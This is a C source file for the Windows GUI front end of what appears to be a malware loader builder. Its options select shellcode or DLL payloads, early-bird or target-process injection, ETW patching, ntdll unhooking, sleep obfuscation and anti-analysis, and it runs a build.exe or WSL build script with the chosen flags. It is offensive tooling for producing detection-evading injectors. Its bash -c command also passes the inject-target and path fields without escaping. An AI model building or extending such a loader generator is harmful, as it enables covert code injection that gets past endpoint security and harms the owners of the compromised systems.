#include "gui.h"

typedef struct { HWND hwnd; WCHAR cmd[4096]; } BUILD_ARGS;

static DWORD WINAPI BuildThread(LPVOID param) {
    BUILD_ARGS *a = (BUILD_ARGS*)param;

    HANDLE hR, hW;
    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
    if (!CreatePipe(&hR, &hW, &sa, 0)) {
        PostMessageW(a->hwnd, WM_APPEND_LOG, 0,
                     (LPARAM)_wcsdup(L"[!] CreatePipe failed\r\n"));
        PostMessageW(a->hwnd, WM_BUILD_DONE, 1, 0);
        free(a); return 1;
    }
    SetHandleInformation(hR, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOW si = { sizeof(si) };
    si.dwFlags    = STARTF_USESTDHANDLES;
    si.hStdOutput = hW;
    si.hStdError  = hW;
    si.hStdInput  = NULL;

    PROCESS_INFORMATION pi = {0};
    if (!CreateProcessW(NULL, a->cmd, NULL, NULL, TRUE,
                        CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(hR); CloseHandle(hW);
        PostMessageW(a->hwnd, WM_APPEND_LOG, 0,
                     (LPARAM)_wcsdup(L"[!] failed to start wsl.exe — is WSL installed?\r\n"));
        PostMessageW(a->hwnd, WM_BUILD_DONE, 1, 0);
        free(a); return 1;
    }
    CloseHandle(hW);

    char buf[512]; DWORD nr;
    while (ReadFile(hR, buf, sizeof(buf) - 1, &nr, NULL) && nr) {
        buf[nr] = '\0';
        int wlen = MultiByteToWideChar(CP_UTF8, 0, buf, -1, NULL, 0);
        WCHAR *wb = malloc((size_t)wlen * sizeof(WCHAR));
        MultiByteToWideChar(CP_UTF8, 0, buf, -1, wb, wlen);
        PostMessageW(a->hwnd, WM_APPEND_LOG, 0, (LPARAM)wb);
    }
    CloseHandle(hR);

    DWORD code = 0;
    WaitForSingleObject(pi.hProcess, INFINITE);
    GetExitCodeProcess(pi.hProcess, &code);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    PostMessageW(a->hwnd, WM_BUILD_DONE, (WPARAM)code, 0);
    free(a);
    return 0;
}

#pragma warning(suppress: 6262)
void OnBuild(HWND hwnd) {
    BOOL bDll   = (SendMessageW(g_hRadioDLL,   BM_GETCHECK, 0, 0) == BST_CHECKED);
    BOOL bEarly = (SendMessageW(g_hRadioEarly, BM_GETCHECK, 0, 0) == BST_CHECKED);
    BOOL bAA    = (SendMessageW(g_hChkAA,      BM_GETCHECK, 0, 0) == BST_CHECKED);
    BOOL bDbg   = (SendMessageW(g_hChkDbg,     BM_GETCHECK, 0, 0) == BST_CHECKED);
    BOOL bEtw   = (SendMessageW(g_hChkEtw,     BM_GETCHECK, 0, 0) == BST_CHECKED);
    BOOL bUnhk  = (SendMessageW(g_hChkUnhook,  BM_GETCHECK, 0, 0) == BST_CHECKED);
    BOOL bSlp   = (SendMessageW(g_hChkSlp,     BM_GETCHECK, 0, 0) == BST_CHECKED);

    WCHAR path_w[MAX_PATH] = {0};
    GetWindowTextW(g_hFile, path_w, MAX_PATH);
    if (!path_w[0]) {
        MessageBoxW(hwnd, L"Select or generate a payload file.", L"Missing input", MB_ICONWARNING);
        return;
    }

    WCHAR slpms_w[32] = {0};
    GetWindowTextW(g_hSleepMs, slpms_w, 32);
    if (bSlp && slpms_w[0]) {
        for (int i = 0; slpms_w[i]; i++) {
            if (!iswdigit(slpms_w[i])) {
                MessageBoxW(hwnd, L"Sleep MS must be a number.", L"Invalid input", MB_ICONWARNING);
                return;
            }
        }
    }

    WCHAR out_w[256] = {0};
    GetWindowTextW(g_hOutput, out_w, 256);
    if (out_w[0]) {
        static const WCHAR bad[] = L"\"'`$;&|/\\";
        for (int i = 0; out_w[i]; i++) {
            for (int j = 0; bad[j]; j++) {
                if (out_w[i] == bad[j]) {
                    MessageBoxW(hwnd, L"Output name contains invalid characters.",
                                L"Invalid input", MB_ICONWARNING);
                    return;
                }
            }
        }
    }

    WCHAR inject_w[512] = {0};
    GetWindowTextW(g_hInjectField, inject_w, 512);

    WCHAR exe_dir_w[MAX_PATH];
    GetModuleFileNameW(NULL, exe_dir_w, MAX_PATH);
    WCHAR *exesep = wcsrchr(exe_dir_w, L'\\');
    if (exesep) *(exesep + 1) = L'\0';

    WCHAR build_exe_w[MAX_PATH];
    swprintf(build_exe_w, MAX_PATH, L"%sbuild.exe", exe_dir_w);
    BOOL bHasNative = (GetFileAttributesW(build_exe_w) != INVALID_FILE_ATTRIBUTES);

    if (bHasNative) {
        WCHAR ncmd[4096]; int nc = 0;
        nc += swprintf(ncmd+nc, 4096-nc, L"\"%sbuild.exe\" %s \"%s\"",
                       exe_dir_w,
                       bDll ? L"--dll" : L"--payload",
                       path_w);
        if (!bEarly && inject_w[0])
            nc += swprintf(ncmd+nc, 4096-nc, L" --target \"%s\"", inject_w);
        if (bEarly) {
            nc += swprintf(ncmd+nc, 4096-nc, L" --inject early-bird");
            if (inject_w[0])
                nc += swprintf(ncmd+nc, 4096-nc, L" --spawn \"%s\"", inject_w);
        }
        if (!bAA)  nc += swprintf(ncmd+nc, 4096-nc, L" --no-aa");
        if (bDbg)  nc += swprintf(ncmd+nc, 4096-nc, L" --debug");
        if (bEtw)  nc += swprintf(ncmd+nc, 4096-nc, L" --etw-patch");
        if (bUnhk) nc += swprintf(ncmd+nc, 4096-nc, L" --unhook");
        if (bSlp)  nc += swprintf(ncmd+nc, 4096-nc, L" --sleep-obf");
        if (bSlp && slpms_w[0])
                   nc += swprintf(ncmd+nc, 4096-nc, L" --sleep-ms %s", slpms_w);
        if (out_w[0])
                   nc += swprintf(ncmd+nc, 4096-nc, L" --out \"%s\"", out_w);

        BUILD_ARGS *args = malloc(sizeof(*args));
        args->hwnd = hwnd;
        wcscpy(args->cmd, ncmd);
        WCHAR echo[4200]; swprintf(echo, 4200, L"> %s\r\n", ncmd);
        AppendLog(echo);
        EnableWindow(g_hBtnBuild, FALSE);
        HANDLE ht = CreateThread(NULL, 0, BuildThread, args, 0, NULL);
        if (ht) CloseHandle(ht);
        else    { EnableWindow(g_hBtnBuild, TRUE); free(args); }
        return;
    }

    char path_wsl[MAX_PATH];
    win_to_wsl(path_w, path_wsl, MAX_PATH);

    char inject_n[512]={0}, out_n[256]={0}, slpms_n[32]={0};
    if (inject_w[0]) WideCharToMultiByte(CP_UTF8,0,inject_w,-1,inject_n,512,NULL,NULL);
    if (out_w[0])    WideCharToMultiByte(CP_UTF8,0,out_w,   -1,out_n,   256,NULL,NULL);
    if (slpms_w[0])  WideCharToMultiByte(CP_UTF8,0,slpms_w, -1,slpms_n,  32,NULL,NULL);

    char builder_dir[MAX_PATH];
    win_to_wsl(exe_dir_w, builder_dir, MAX_PATH);
    int dl = (int)strlen(builder_dir);
    if (dl > 1 && builder_dir[dl-1] == '/') builder_dir[dl-1] = '\0';

    char shell[4096] = {0};
    int sc = 0;

    sc += snprintf(shell+sc, sizeof(shell)-sc,
                   "'%s/build' %s '%s'",
                   builder_dir,
                   bDll ? "--dll" : "--payload",
                   path_wsl);

    if (!bEarly && inject_n[0])
        sc += snprintf(shell+sc, sizeof(shell)-sc, " --target '%s'", inject_n);

    if (bEarly) {
        sc += snprintf(shell+sc, sizeof(shell)-sc, " --inject early-bird");
        if (inject_n[0])
            sc += snprintf(shell+sc, sizeof(shell)-sc, " --spawn '%s'", inject_n);
    }

    if (!bAA)  sc += snprintf(shell+sc, sizeof(shell)-sc, " --no-aa");
    if (bDbg)  sc += snprintf(shell+sc, sizeof(shell)-sc, " --debug");
    if (bEtw)  sc += snprintf(shell+sc, sizeof(shell)-sc, " --etw-patch");
    if (bUnhk) sc += snprintf(shell+sc, sizeof(shell)-sc, " --unhook");
    if (bSlp)  sc += snprintf(shell+sc, sizeof(shell)-sc, " --sleep-obf");
    if (bSlp && slpms_n[0])
               sc += snprintf(shell+sc, sizeof(shell)-sc, " --sleep-ms %s", slpms_n);
    if (out_n[0])
               sc += snprintf(shell+sc, sizeof(shell)-sc, " --out '%s'", out_n);

    BUILD_ARGS *args = malloc(sizeof(*args));
    args->hwnd = hwnd;
    swprintf(args->cmd, 4096, L"wsl.exe -- bash -c \"%hs\"", shell);

    WCHAR echo[4200];
    swprintf(echo, 4200, L"> %hs\r\n", shell);
    AppendLog(echo);

    EnableWindow(g_hBtnBuild, FALSE);
    HANDLE ht = CreateThread(NULL, 0, BuildThread, args, 0, NULL);
    if (ht) CloseHandle(ht);
    else    { EnableWindow(g_hBtnBuild, TRUE); free(args); }
}
